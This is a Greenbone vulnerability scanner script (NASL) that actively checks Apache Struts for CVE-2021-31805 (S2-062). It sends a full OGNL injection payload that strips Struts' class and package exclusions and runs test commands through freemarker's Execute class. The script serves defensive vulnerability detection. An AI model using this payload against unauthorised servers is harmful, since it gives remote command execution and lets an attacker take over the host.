# Copyright (C) 2022 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.148043");
  script_version("2022-05-06T05:53:30+0000");
  script_tag(name:"last_modification", value:"2022-05-06 05:53:30 +0000 (Fri, 06 May 2022)");
  script_tag(name:"creation_date", value:"2022-05-04 03:56:12 +0000 (Wed, 04 May 2022)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"severity_vector", value:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2021-07-20 23:15:00 +0000 (Tue, 20 Jul 2021)");

  script_cve_id("CVE-2021-31805");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Apache Struts Security Update (S2-062) - Active Check");

  script_category(ACT_ATTACK);

  script_family("Web application abuses");
  script_copyright("Copyright (C) 2022 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "httpver.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "os_detection.nasl", "gb_vmware_vcenter_server_http_detect.nasl");
  script_require_ports("Services/www", 8080);
  script_mandatory_keys("www/action_jsp_do");

  script_tag(name:"summary", value:"Apache Struts is prone to a remote code execution (RCE)
  vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request and checks the response.");

  script_tag(name:"insight", value:"The fix issued for CVE-2020-17530 (S2-061) was incomplete. Still
  some of the tag's attributes could perform a double evaluation if a developer applied forced OGNL
  evaluation by using the %{...} syntax. Using forced OGNL evaluation on untrusted user input can
  lead to a Remote Code Execution and security degradation.");

  script_tag(name:"affected", value:"Apache Struts version 2.0.0 through 2.5.29 if forced OGNL
  evaluation is applied on untrusted user input in the application.");

  script_tag(name:"solution", value:"Avoid using forced OGNL evaluation on untrusted user input,
  and/or upgrade to Struts 2.5.30 or greater which checks if expression evaluation won't lead to the
  double evaluation.");

  script_xref(name:"URL", value:"https://cwiki.apache.org/confluence/display/WW/S2-062");
  script_xref(name:"URL", value:"https://github.com/Axx8/Struts2_S2-062_CVE-2021-31805");
  script_xref(name:"Advisory-ID", value:"S2-062");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("list_array_func.inc");
include("misc_func.inc");
include("os_func.inc");
include("port_service_func.inc");

port = http_get_port(default: 8080);
host = http_host_name(dont_add_port: TRUE);

urls = make_list();

foreach ext (make_list("action", "do", "jsp")) {
  exts = http_get_kb_file_extensions(port: port, host: host, ext: ext);
  if (exts && is_array(exts)) {
    urls = make_list(urls, exts);
  }
}

if (get_kb_item("vmware/vcenter/server/http/detected"))
  urls = make_list_unique("/statsreport/", urls);

x = 0;
cmds = exploit_commands();
vt_strings = get_vt_strings();
bound = '------------------------' + vt_strings["default"];
headers = make_array("Content-Type", "multipart/form-data; boundary=" + bound);

foreach url (urls) {

  x++;

  foreach pattern (keys(cmds)) {
    post_data = '--' + bound + '\r\n' +
                'Content-Disposition: form-data; name="id"\r\n\r\n' +
                '%{\n' +
                "(#request.map=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +" + '\n' +
                "(#request.map.setBean(#request.get('struts.valueStack')) == true).toString().substring(0,0) +" + '\n' +
                '(#request.map2=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +\n' +
                "(#request.map2.setBean(#request.get('map').get('context')) == true).toString().substring(0,0) +" + '\n' +
                '(#request.map3=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +\n' +
                "(#request.map3.setBean(#request.get('map2').get('memberAccess')) == true).toString().substring(0,0) +" + '\n' +
                "(#request.get('map3').put('excludedPackageNames',#@org.apache.commons.collections.BeanMap@{}.keySet()) == true).toString().substring(0,0) +" + '\n' +
                "(#request.get('map3').put('excludedClasses',#@org.apache.commons.collections.BeanMap@{}.keySet()) == true).toString().substring(0,0) +" + '\n' +
                "(#application.get('org.apache.tomcat.InstanceManager').newInstance('freemarker.template.utility.Execute').exec({'" + cmds[pattern] + "'}))" + '\n' +
                "}" + '\r\n\r\n' +
                '--' + bound + '--\r\n';

    req = http_post_put_req(port: port, url: url, data: post_data, add_headers: headers);
    res = http_keepalive_send_recv(port: port, data: req, bodyonly: TRUE);

    if (result = egrep(pattern: pattern, string: res)) {
      info["HTTP Method"] = "POST";
      info["Affected URL"] = http_report_vuln_url(port: port, url: url, url_only: TRUE);
      info['HTTP "POST" body'] = post_data;
      info['HTTP "Content-Type" header'] = headers["Content-Type"];

      report  = 'By doing the following HTTP request:\n\n';
      report += text_format_table(array: info) + '\n\n';
      report += 'it was possible to execute the "' + cmds[pattern] + '" command on the target host.';
      report += '\n\nResult:\n\n' + result;
      expert_info = 'Request:\n\n' + req + '\n\nResponse:\n\n' + res;
      security_message(port: port, data: report, expert_info: expert_info);
      exit(0);
    }
  }

  if (x > 25) # nb: No need to continue, the system is very unlikely affected...
    break;
}

exit(0);
